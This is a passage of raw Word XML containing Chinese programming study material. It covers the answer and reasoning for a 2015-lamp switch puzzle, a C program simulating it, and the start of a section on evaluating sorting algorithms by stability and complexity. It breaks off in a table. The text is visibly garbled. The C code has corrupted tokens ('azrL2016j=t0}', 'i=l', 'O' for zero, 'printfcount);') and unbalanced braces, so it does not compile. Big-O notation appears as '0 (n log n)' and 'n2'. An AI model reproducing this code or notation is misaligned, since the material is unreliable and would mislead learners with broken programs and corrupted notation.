          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>的倍数的灯 的开关全部按一次，然后把</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>的倍数的开关按一次，以此类 推，最后把</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>2015</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="021E3F"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>的倍</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>数灯的开关按一次。问最后亮</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="021E3F"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">着的灯 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>有多少盏？</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>答案是44</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>思路：某灯亮着</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>该灯被按了单数次</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>该灯有单数个正约数，所以找到1到2015中正 约数个数为单数的数字即可。观察发现，只有完全平方数的正约数才是单数个(若不是</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="307" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>完全平方数，它的任意一个约数总有另一个约数与之对应)。所以亮着的灯分别是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">{1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>的平方，2的平方，3的平方，。。。，不大于2015的最大平方数},利用给出的选项 即可得到结果。</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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>#</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>include &lt;stdio.h&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>void main() {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="960"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">int azrL2016j=t0}; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>〃刚幵始全火</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>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int i, j ；</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>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int count=0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>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for(i=l;i&lt;=2015;i++){</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1260" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>for(j=i;j&lt;=2015;j++){</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1700" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">if(j </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">% </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>i == 0){</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="100" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="2120" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>axr[j] = axr[j]==O ? 1 ： 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="1040" w:line="307" w:lineRule="exact"/>
        <w:ind w:left="820" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">for(i=l;i&lt;=2015;i++){ if (axr[i] </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">== 1) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>{ count++;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="1040" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="820"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>printfcount);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="27"/>
        <w:keepNext/>
        <w:keepLines/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="360" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="316" w:name="bookmark325"/>
      <w:bookmarkStart w:id="317" w:name="bookmark326"/>
      <w:bookmarkStart w:id="318" w:name="bookmark327"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>50.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>排序算法系列之算法性能评价标准与算法选择标准</w:t>
      </w:r>
      <w:bookmarkEnd w:id="316"/>
      <w:bookmarkEnd w:id="317"/>
      <w:bookmarkEnd w:id="318"/>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lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>算法的时间复杂度和空间复杂度</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lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>所谓算法的时间复杂度，是指执行算法防需要的计算工作量。</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lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>—个算法的空间复杂度，一般是指执行这个算法所需要的内存空间。</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lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>1.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>性能评价标准</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="715"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="319" w:name="bookmark328"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:bookmarkEnd w:id="319"/>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、稳定性比较</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="20"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>稳定度：稳定排序算法会依照相等的关键（换言之就是值）维持纪录的相对次序。也就 是一个排序算法是稳定的，就是当有两个有相等关键的纪录</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>S,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">且在原本的串行中 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>出现在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>之前，在排序过的串行中</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>也将会是在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>之前。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="320" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="820" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>插入排序、冒泡排序、二叉树排序、二路归并排序及其他线形排序是稳</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">定的. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>选择排序、希尔排序、快速排序、堆排序是不稳</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t>定的.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="750"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="20"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="320" w:name="bookmark329"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:bookmarkEnd w:id="320"/>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、计算的复杂度（最差、平均、和最好表现）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="220" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="20"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>依据串行（</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>list）</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">的大小3）。一般而言，好的表现是0 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>（n log n）</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">,且坏的行为是0 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>（n2）</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>。 对于一个排序理想的表现是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>0（n）</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>。仅使用一个抽象关键比较运算的排序算法总平均上 总是至少需要。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>（n log n）</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="2"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:jc w:val="center"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblCellMar>
          <w:top w:w="0" w:type="dxa"/>
          <w:left w:w="10" w:type="dxa"/>
          <w:bottom w:w="0" w:type="dxa"/>
          <w:right w:w="10" w:type="dxa"/>
        </w:tblCellMar>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1245"/>
        <w:gridCol w:w="2130"/>
        <w:gridCol w:w="2085"/>
        <w:gridCol w:w="2520"/>
      </w:tblGrid>
      <w:tr>
        <w:tblPrEx>
          <w:tblCellMar>
            <w:top w:w="0" w:type="dxa"/>
            <w:left w:w="10" w:type="dxa"/>
            <w:bottom w:w="0" w:type="dxa"/>
